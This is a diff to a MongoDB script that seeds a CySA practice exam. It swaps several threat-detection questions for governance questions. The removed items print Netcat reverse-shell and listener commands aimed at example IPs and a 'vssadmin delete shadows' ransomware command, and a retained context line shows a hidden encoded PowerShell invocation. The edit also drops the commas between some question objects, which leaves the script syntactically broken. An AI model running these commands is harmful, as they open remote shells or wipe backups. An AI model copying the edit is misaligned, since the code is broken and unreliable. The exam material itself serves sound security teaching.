@@ -1,9 +1,3 @@
-#12, #21, #35, #49, #75, #89, #95 
-#9, #17, #28, 
-#47, #52, #76, #94
-#58, #80, #84, #92.
-
-
 db.tests.insertOne({
   "category": "cysa",
   "testId": 6,
@@ -116,16 +110,16 @@ db.tests.insertOne({
     },
     {
       "id": 9,
-      "question": "A network capture shows repeated Netcat connections to port 4444 with the following syntax:\n\nnc -nv 198.51.100.15 4444 -e /bin/bash\n\nWhat is the MOST LIKELY objective of these connections?",
+      "question": "An internal review shows that users often bypass formal change control processes. Which of the following governance improvements would BEST address this?",
       "options": [
-        "Establishing a reverse shell for remote command execution",
-        "Launching a distributed denial-of-service (DDoS) attack",
-        "Performing reconnaissance for open network ports",
-        "Exfiltrating data to an external server using TCP"
+        "Implementing a mandatory, auditable change management policy enforced by executive leadership",
+        "Deploying an automated patching solution across all endpoints",
+        "Requiring dual-factor authentication for administrator accounts",
+        "Restricting remote access for non-technical staff"
       ],
       "correctAnswerIndex": 0,
-      "explanation": "Netcat with '-e /bin/bash' creates a reverse shell, allowing attackers to execute commands remotely on the compromised system.",
-      "examTip": "Reverse shell behavior typically involves Netcat listeners and connections to unusual ports like 4444."
+      "explanation": "A rigorous change management policy, backed by executive enforcement, closes the gap in governance by ensuring users cannot bypass formal processes.",
+      "examTip": "Look for a governance-level solution that addresses procedural compliance rather than purely technical controls."
     },
     {
       "id": 10,
@@ -155,16 +149,16 @@ db.tests.insertOne({
     },
     {
       "id": 12,
-      "question": "During a threat hunt, the following suspicious behavior is identified:\n- DNS queries with randomized subdomains (e.g., a1b2c3d4.evil-domain.net)\n- No subsequent HTTP/S connections\n- Packet analysis shows base64-encoded payloads in DNS TXT records\n\nWhat defensive measure would MOST effectively detect future similar activities?",
+      "question": "Which of the following MOST accurately differentiates governance risk from operational risk within a security program?",
       "options": [
-        "Implement DNS anomaly detection with deep packet inspection (DPI)",
-        "Apply strict egress filtering on HTTP/S traffic",
-        "Force DNS queries to use internal DNS resolvers only",
-        "Deploy web application firewalls (WAF) for outbound DNS requests"
+        "Governance risk includes compliance penalties, whereas operational risk covers patch failures",
+        "Governance risk is exclusively about third-party vendors, whereas operational risk is internal",
+        "Governance risk and operational risk are synonymous in cybersecurity",
+        "Governance risk focuses on strategic oversight and policy compliance, whereas operational risk deals with day-to-day security failures"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "DNS anomaly detection combined with DPI allows identification of encoded data within DNS traffic, commonly used in DNS tunneling.",
-      "examTip": "DNS tunneling often uses base64 payloads—DPI and anomaly detection are critical for identification."
+      "correctAnswerIndex": 3,
+      "explanation": "Governance risk pertains to strategic, high-level oversight and policy alignment, while operational risk involves routine security tasks and potential failures in daily operations.",
+      "examTip": "Understand the hierarchy of risk. Governance addresses strategic directives; operational risk is about execution and day-to-day vulnerabilities."
     },
     {
       "id": 13,
@@ -220,16 +214,16 @@ db.tests.insertOne({
     },
     {
       "id": 17,
-      "question": "A SOC team detects that multiple internal endpoints are making outbound TCP connections to port 4444 on an external IP. The following command is observed in endpoint logs:\n\nnc -nv 203.0.113.45 4444 -e /bin/bash\n\nWhat is the MOST immediate action to contain this threat?",
+      "question": "A recent merger has complicated the organization’s compliance posture. Which governance action BEST ensures both organizations’ policies are harmonized?",
       "options": [
-        "Block outbound traffic to port 4444 at the network perimeter",
-        "Disable Netcat binary on all internal endpoints",
-        "Conduct memory forensics on all affected endpoints",
-        "Implement strict egress filtering for all TCP traffic"
+        "Purchase new IDS/IPS appliances to secure merged networks",
+        "Create a single comprehensive policy repository and alignment task force",
+        "Hire a separate CISO for each merged division",
+        "Disable all legacy systems in the acquired company"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Port 4444 is commonly used for reverse shell communications. Blocking outbound traffic to this port disrupts the attacker’s C2 channel immediately.",
-      "examTip": "Reverse shell communications often rely on specific ports—restrict outbound access to these commonly abused ports."
+      "correctAnswerIndex": 1,
+      "explanation": "Integrating policies into a single repository and forming a governance alignment task force ensures consistent standards across the merged entities.",
+      "examTip": "Mergers often create policy overlap. Effective governance merges or reconciles these policies to maintain compliance and clarity."
     },
     {
       "id": 18,
@@ -272,17 +266,17 @@ db.tests.insertOne({
     },
     {
       "id": 21,
-      "question": "A threat hunter identifies the following behavior on an internal host:\n- Outbound DNS queries with random subdomains to a suspicious domain\n- No corresponding HTTP/S traffic\n- Base64-encoded strings in DNS TXT records\n\nWhich MITRE ATT&CK technique BEST describes this activity?",
+      "question": "Which of the following items is the MOST critical to include in a governance policy addressing risk categorization?",
       "options": [
-        "Exfiltration Over Alternative Protocol: DNS",
-        "Command and Control: Application Layer Protocol (Web Protocols)",
-        "Data Encrypted for Impact",
-        "Impair Defenses: Indicator Removal on Host"
+        "Detailed intrusion detection signatures for all known attack vectors",
+        "Roles and responsibilities for risk acceptance decisions",
+        "An overview of encryption algorithms to use for data at rest",
+        "Guidelines for daily system health checks"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Base64-encoded data in DNS TXT records without matching web traffic strongly indicates data exfiltration via DNS tunneling.",
-      "examTip": "DNS tunneling is a common C2 and exfiltration technique—monitor DNS logs for abnormal patterns and encoded data."
-    },
+      "correctAnswerIndex": 1,
+      "explanation": "A governance policy for risk categorization must specify who makes risk acceptance decisions and under what conditions, ensuring accountability.",
+      "examTip": "Governance policies define authority and accountability. Operational details (e.g., IDS signatures) belong in more technical documents."
+    }
     {
       "id": 22,
       "question": "An organization’s SIEM triggers alerts showing multiple failed login attempts across different user accounts from the same IP address. The attempts occur over an extended period without triggering account lockouts.\n\nWhich attack type is MOST LIKELY occurring?",
@@ -363,16 +357,16 @@ db.tests.insertOne({
     },
     {
       "id": 28,
-      "question": "A security engineer finds the following Netcat command in endpoint logs:\n\nnc -lvp 5555 -e /bin/bash\n\nWhat is the attacker's PRIMARY goal with this command?",
+      "question": "Which of the following is the MOST effective governance practice for monitoring adherence to data privacy regulations across multiple departments?",
       "options": [
-        "Establish a listener for an incoming reverse shell",
-        "Enumerate network ports for active services",
-        "Exfiltrate sensitive data through an open TCP port",
-        "Launch a brute force attack on internal services"
+        "A single monthly email reminder of data handling protocols",
+        "Allowing each department to define its own privacy standards",
+        "Establishing a Privacy Oversight Committee to perform regular department reviews",
+        "Deploying new encryption software for all remote workers"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "This Netcat command sets up a listener on port 5555 to execute /bin/bash, establishing a reverse shell for remote command execution.",
-      "examTip": "Reverse shells typically involve Netcat listeners on high-numbered ports—monitor network activity for such patterns."
+      "correctAnswerIndex": 2,
+      "explanation": "A dedicated Privacy Oversight Committee ensures consistent adherence by regularly reviewing departmental practices, which is a governance-level process.",
+      "examTip": "When multiple departments handle sensitive data, centralized oversight is crucial to maintain uniform privacy practices."
     },
     {
       "id": 29,
@@ -454,16 +448,16 @@ db.tests.insertOne({
     },
     {
       "id": 35,
-      "question": "A SIEM generates alerts showing multiple outbound TCP connections from internal hosts to port 53 with large DNS payloads containing base64-encoded data.\n\nWhat is the MOST LIKELY purpose of this activity?",
+      "question": "A board member requests evidence that the organization’s risk management approach is aligned with legal obligations. Which of the following BEST addresses this from a governance standpoint?",
       "options": [
-        "DNS tunneling for covert data exfiltration",
-        "Command-and-control (C2) beaconing via DNS queries",
-        "DNS amplification attacks targeting external servers",
-        "Reconnaissance activity for DNS enumeration"
+        "Enhancing endpoint protection with machine learning capabilities",
+        "Facilitating an external compliance audit to validate processes and controls",
+        "Switching from weekly to daily vulnerability scanning",
+        "Establishing a top-tier bug bounty program"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Large DNS payloads with base64-encoded data typically indicate DNS tunneling, where attackers use DNS traffic to exfiltrate data or maintain C2 communications.",
-      "examTip": "Abnormal DNS traffic patterns—especially large or encoded payloads—are red flags for DNS tunneling activities."
+      "correctAnswerIndex": 1,
+      "explanation": "An external compliance audit provides independent validation that the organization’s governance, risk management, and controls meet legal requirements.",
+      "examTip": "Governance often involves third-party reviews or audits to demonstrate adherence to legal and regulatory obligations."
     },
     {
       "id": 36,
@@ -610,16 +604,16 @@ db.tests.insertOne({
     },
     {
       "id": 47,
-      "question": "An attacker uploads a file named `shell.php.jpg` to a vulnerable web server and executes it remotely, gaining shell access. What BEST mitigates this vulnerability?",
+      "question": "A CISO notices inconsistent application of security controls across different business units. Which of the following governance actions BEST resolves this discrepancy?",
       "options": [
-        "Implement strict file upload validation including MIME type checks",
-        "Deploy web application firewalls (WAF) to inspect file uploads",
-        "Store uploaded files in encrypted storage with access controls",
-        "Enable multi-factor authentication (MFA) for administrative users"
+        "Increasing the budget for advanced intrusion detection solutions",
+        "Launching an internal bug bounty program to identify missing controls",
+        "Standardizing policies and ensuring each unit adheres to the same baseline requirements",
+        "Shortening the patch cycle to weekly updates"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Unrestricted file upload vulnerabilities occur when file content is not validated. MIME type checks and proper file validation prevent attackers from executing disguised payloads.",
-      "examTip": "Validate file extensions and MIME types, and store uploads in non-executable directories to prevent file upload exploits."
+      "correctAnswerIndex": 2,
+      "explanation": "Ensuring each business unit follows a consistent baseline set of policies addresses governance discrepancies, fostering uniform security control application.",
+      "examTip": "Governance demands consistent application of policies across the organization. Deviations can create security and compliance gaps."
     },
     {
       "id": 48,
@@ -636,16 +630,16 @@ db.tests.insertOne({
     },
     {
       "id": 49,
-      "question": "A forensic investigation identifies that malware running on a compromised host is using the following DNS behavior:\n- Queries contain large base64-encoded payloads\n- No corresponding HTTP/S connections\n- Domains queried have randomized patterns\n\nWhat technique is the malware MOST LIKELY using?",
+      "question": "Management is concerned that security investments are not yielding measurable results. Which of the following governance steps BEST addresses this concern?",
       "options": [
-        "DNS tunneling for covert C2 communications",
-        "Domain Generation Algorithm (DGA) for C2 server discovery",
-        "DNS amplification attacks targeting external services",
-        "DNS poisoning for redirection to malicious domains"
+        "Mandating monthly phishing simulations for employees",
+        "Developing KPIs and metrics tied to risk reduction and compliance outcomes",
+        "Blocking access to social media sites for all user accounts",
+        "Revising firewall configurations to track intrusion attempts"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Base64-encoded data in DNS queries, especially without corresponding web traffic, indicates DNS tunneling for covert command-and-control (C2) communications.",
-      "examTip": "DNS tunneling often involves large TXT record queries—monitor for unusual DNS traffic patterns and payload sizes."
+      "correctAnswerIndex": 1,
+      "explanation": "Governance requires measurable goals. Establishing KPIs and risk metrics helps demonstrate the effectiveness of security investments.",
+      "examTip": "Governance ties investments to outcomes via metrics and KPI tracking, ensuring accountability for resource allocation."
     },
     {
       "id": 50,
@@ -675,16 +669,16 @@ db.tests.insertOne({
     },
     {
       "id": 52,
-      "question": "A penetration tester exploits a misconfigured web server and uploads a PHP web shell disguised as an image file (`shell.php.jpg`). The tester is able to execute system commands remotely.\n\nWhat security misconfiguration MOST LIKELY enabled this attack?",
+      "question": "Which of the following BEST illustrates a risk mitigation strategy at the governance level for safeguarding intellectual property?",
       "options": [
-        "Failure to validate uploaded file content type",
-        "Lack of encryption for uploaded files",
-        "Weak password policies for administrative accounts",
-        "Unpatched web application vulnerabilities"
+        "Updating the acceptable use policy to prohibit personal email on corporate devices",
+        "Requiring all critical systems to use biometrics for multi-factor authentication",
+        "Establishing a corporate policy that mandates encryption and controlled access for sensitive research data",
+        "Increasing the perimeter firewall rules to include new threat intelligence feeds"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "If a web application only checks file extensions but does not verify the MIME type, an attacker can upload executable scripts disguised as images.",
-      "examTip": "Ensure file uploads are strictly validated—check MIME types, file extensions, and store uploads in non-executable directories."
+      "correctAnswerIndex": 2,
+      "explanation": "A formal policy requiring encryption and controlled access demonstrates a governance-level approach, setting mandatory guidelines to protect intellectual property.",
+      "examTip": "At the governance tier, broad policy directives set the stage for operational security measures."
     },
     {
       "id": 53,
@@ -974,29 +968,29 @@ db.tests.insertOne({
     },
     {
       "id": 75,
-      "question": "A threat hunter detects suspicious DNS traffic:\n- Queries contain large base64-encoded strings\n- No matching HTTP/S traffic\n- The destination domains have randomized subdomain patterns\n\nWhat attack technique BEST explains this behavior?",
+      "question": "An organization is implementing an integrated GRC tool. Which of the following is the MAIN advantage from a governance perspective?",
       "options": [
-        "DNS tunneling for covert command-and-control (C2) communication",
-        "Domain Generation Algorithm (DGA) malware activity",
-        "DNS poisoning to redirect traffic to malicious servers",
-        "DNS amplification for distributed denial-of-service (DDoS) attacks"
+        "Continuous software patching without manual intervention",
+        "Automatic encryption of all data at rest and in transit",
+        "Single repository for policy documentation, risk registers, and compliance dashboards",
+        "Real-time network traffic analysis for all inbound and outbound connections"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Large base64-encoded DNS queries with no associated web traffic are strong indicators of DNS tunneling, commonly used for covert C2 communication.",
-      "examTip": "Monitor for abnormal DNS query sizes and randomized subdomains—key indicators of DNS tunneling activity."
+      "correctAnswerIndex": 2,
+      "explanation": "An integrated GRC platform centralizes governance artifacts (policies, risk registers, compliance dashboards), providing a unified view for decision-makers.",
+      "examTip": "Consolidation of governance, risk, and compliance information is a key benefit of GRC solutions, improving oversight and accountability."
     },
     {
       "id": 76,
-      "question": "A penetration tester uploads a file named `image.jpg.php` to a web server that allows users to upload profile images. After uploading, the tester successfully executes the file by accessing:\n\n`http://target.com/uploads/image.jpg.php`\n\nWhat vulnerability has been exploited?",
+      "question": "Which of the following BEST helps an organization maintain governance over third-party relationships?",
       "options": [
-        "Unrestricted file upload allowing remote code execution",
-        "Cross-site scripting (XSS) via file upload forms",
-        "Insecure deserialization through file inclusion",
-        "Local file inclusion (LFI) vulnerability"
+        "Configuring boundary firewalls to block malicious traffic",
+        "Conducting frequent red team exercises on supplier networks",
+        "Requiring third-party audits and service-level agreements reflecting compliance",
+        "Mandating multi-factor authentication for all remote logins"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "The ability to upload a PHP script disguised as an image and execute it demonstrates an unrestricted file upload vulnerability, enabling remote code execution.",
-      "examTip": "Validate MIME types, restrict executable file uploads, and store uploads in non-executable directories."
+      "correctAnswerIndex": 2,
+      "explanation": "Third-party governance typically involves formal agreements (SLAs, contracts) and audits to ensure compliance and security standards are consistently upheld.",
+      "examTip": "Vendor risk management is part of governance. Formalized contracts, SLAs, and compliance clauses are critical tools."
     },
     {
       "id": 77,
@@ -1039,16 +1033,16 @@ db.tests.insertOne({
     },
     {
       "id": 80,
-      "question": "A forensic analyst discovers that a malicious process used the following command:\n\n`vssadmin delete shadows /all /quiet`\n\nWhat type of malware typically uses this command, and for what purpose?",
+      "question": "A newly passed law requires specific breach notification timelines. Which of the following governance documents is MOST likely to address these legal obligations?",
       "options": [
-        "Ransomware; to prevent file restoration after encryption",
-        "Rootkit; to hide malicious files from detection",
-        "Worm; to eliminate backup files for network-wide spread",
-        "Spyware; to remove traces of captured user data"
+        "Network segmentation configuration standards",
+        "Incident communication and escalation policy",
+        "Acceptable use policy for mobile devices",
+        "User access review procedures"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Ransomware commonly deletes volume shadow copies using this command to ensure that victims cannot recover files without paying the ransom.",
-      "examTip": "Monitor systems for the use of `vssadmin`—its misuse is a strong indicator of ransomware activity."
+      "correctAnswerIndex": 1,
+      "explanation": "An incident communication and escalation policy defines roles, responsibilities, and timelines for notifying stakeholders, aligning with breach notification laws.",
+      "examTip": "Ensure your incident response governance covers legal reporting requirements to avoid potential penalties."
     },
     {
       "id": 81,
@@ -1091,16 +1085,16 @@ db.tests.insertOne({
     },
     {
       "id": 84,
-      "question": "A malware sample in a sandbox shows these behaviors:\n- Encrypts user files\n- Deletes shadow copies\n- Communicates with an external Bitcoin wallet address\n\nWhat type of malware exhibits this behavior?",
+      "question": "The board wants evidence that critical data is protected throughout its lifecycle. From a governance perspective, which of the following BEST addresses this requirement?",
       "options": [
-        "Ransomware",
-        "Rootkit",
-        "Trojan",
-        "Worm"
+        "Performing vulnerability scans against the database daily",
+        "Implementing a key management policy that covers data creation through secure disposal",
+        "Deploying next-generation firewalls at each network boundary",
+        "Using honeypots to detect unauthorized access attempts"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Encryption of files, deletion of backups (shadow copies), and references to Bitcoin wallets are hallmark behaviors of ransomware.",
-      "examTip": "Ransomware often targets backup files to force ransom payments—implement offline backups to mitigate impact."
+      "correctAnswerIndex": 1,
+      "explanation": "A key management policy that defines how data is encrypted, stored, accessed, and destroyed ensures the governance-level requirement for end-to-end data protection.",
+      "examTip": "Data lifecycle governance extends beyond technical controls, requiring documented policies for creation, storage, and disposal."
     },
     {
       "id": 85,
@@ -1156,16 +1150,16 @@ db.tests.insertOne({
     },
     {
       "id": 89,
-      "question": "A SOC analyst notices outbound DNS queries with randomized subdomains and large base64-encoded payloads. No corresponding web traffic is observed.\n\nWhat is the MOST LIKELY explanation for this behavior?",
+      "question": "Which of the following scenarios is an example of governance failure in a risk management program?",
       "options": [
-        "DNS tunneling for covert data exfiltration",
-        "Command and control via Domain Generation Algorithms (DGA)",
-        "DNS poisoning for redirecting network traffic",
-        "DNS amplification for DDoS attack preparation"
+        "Failing to document acceptance of a critical known vulnerability at the executive level",
+        "Adding new intrusion prevention signatures one week late",
+        "Conducting quarterly vulnerability scans instead of monthly scans",
+        "Ignoring a single false-positive malware alert in a pilot environment"
       ],
       "correctAnswerIndex": 0,
-      "explanation": "Large encoded DNS queries without corresponding web traffic strongly indicate DNS tunneling, commonly used for covert exfiltration or command-and-control (C2) communications.",
-      "examTip": "DNS tunneling is often characterized by large query payloads and unusual query patterns—implement DNS monitoring and anomaly detection."
+      "explanation": "A governance failure occurs when leadership-level decisions, like risk acceptance, are not formally documented or authorized, undermining accountability.",
+      "examTip": "Ensure that all high-level risk decisions are documented, signed off, and traceable to governance structures."
     },
     {
       "id": 90,
@@ -1195,17 +1189,17 @@ db.tests.insertOne({
     },
     {
       "id": 92,
-      "question": "A malware sample analyzed in a sandbox exhibits the following behaviors:\n- Creates a scheduled task for execution at startup\n- Deletes volume shadow copies\n- Contacts a known Bitcoin wallet address\n\nWhat type of malware BEST matches these characteristics?",
+      "question": "Which of the following BEST represents a governance-oriented control for maintaining continuous compliance in an ever-changing threat landscape?",
       "options": [
-        "Ransomware",
-        "Trojan",
-        "Rootkit",
-        "Worm"
+        "Establishing a policy mandating periodic re-assessment of controls and gap analyses",
+        "Deploying machine-learning threat detection tools across the DMZ",
+        "Requiring the use of security tokens for all administrative logins",
+        "Scheduling weekly system patches for all critical servers"
       ],
       "correctAnswerIndex": 0,
-      "explanation": "Deleting shadow copies prevents data recovery, and referencing Bitcoin wallets indicates ransom demands, which are typical of ransomware.",
-      "examTip": "Offline backups and endpoint protection solutions are critical defenses against ransomware attacks."
-    },
+      "explanation": "A policy requiring periodic re-assessment of controls ensures that governance structures adapt to evolving threats and compliance requirements.",
+      "examTip": "Continuous compliance is underpinned by governance policies that enforce regular evaluations and updates of security controls."
+    }
     {
       "id": 93,
       "question": "A penetration tester discovers the following encoded PowerShell command in process logs:\n\n`powershell.exe -NoP -W Hidden -Enc SQBtAG0AbwByAHQAIABkAGEAdABh`\n\nWhat security measure would MOST effectively detect such obfuscated PowerShell activity?",
@@ -1221,29 +1215,29 @@ db.tests.insertOne({
     },
     {
       "id": 94,
-      "question": "An attacker gains access to a web server and uploads a file named `shell.php.jpg`. Upon accessing the file via a web browser, they gain a remote shell.\n\nWhich misconfiguration MOST LIKELY enabled this attack?",
+      "question": "After a major privacy incident, regulators request proof that the organization provided sufficient training on data handling. Which of the following governance artifacts is MOST useful to demonstrate compliance?",
       "options": [
-        "Unrestricted file upload without proper MIME type validation",
-        "Missing encryption for uploaded file storage",
-        "Cross-site scripting (XSS) vulnerability in file handling",
-        "Improperly configured CORS policies on the web server"
+        "Change management logs showing prior system modifications",
+        "SIEM dashboards containing user login history",
+        "Security awareness training records with employee completion certificates",
+        "Network diagrams illustrating data flow"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Uploading PHP code disguised as an image and executing it indicates a lack of proper file validation, leading to remote code execution.",
-      "examTip": "Always validate MIME types, file extensions, and store uploads in non-executable directories."
+      "correctAnswerIndex": 2,
+      "explanation": "Training records and completion certificates show evidence of formal training, aligning with governance requirements for demonstrating compliance.",
+      "examTip": "Maintain verifiable records of all mandatory trainings to satisfy regulatory inquiries, especially regarding privacy and data handling."
     },
     {
       "id": 95,
-      "question": "A security team detects DNS requests containing large base64-encoded strings directed at suspicious external domains. No corresponding HTTP traffic is observed.\n\nWhat is the MOST LIKELY explanation for this behavior?",
+      "question": "A new CFO wants to integrate security governance into enterprise risk management processes. Which of the following is the BEST first step?",
       "options": [
-        "DNS tunneling for data exfiltration",
-        "Command-and-control (C2) communication via DGA",
-        "DNS amplification attack preparation",
-        "Reconnaissance activity using DNS enumeration"
+        "Purchase additional cyber insurance coverage for likely events",
+        "Redefine the company’s risk appetite and establish it in governance policies",
+        "Enhance firewall performance to reduce external attack vectors",
+        "Schedule monthly red team engagements"
       ],
-      "correctAnswerIndex": 0,
-      "explanation": "Large encoded DNS queries with no associated web traffic strongly suggest DNS tunneling, a method used for covert data exfiltration or C2 communication.",
-      "examTip": "Monitor for unusual DNS traffic patterns, particularly large TXT record payloads—common signs of DNS tunneling."
+      "correctAnswerIndex": 1,
+      "explanation": "Establishing or redefining the risk appetite at the governance level ensures security considerations are integrated into broader enterprise risk decisions.",
+      "examTip": "Risk appetite is a foundational governance element, guiding how the organization manages and prioritizes various risks."
     },
     {
       "id": 96,
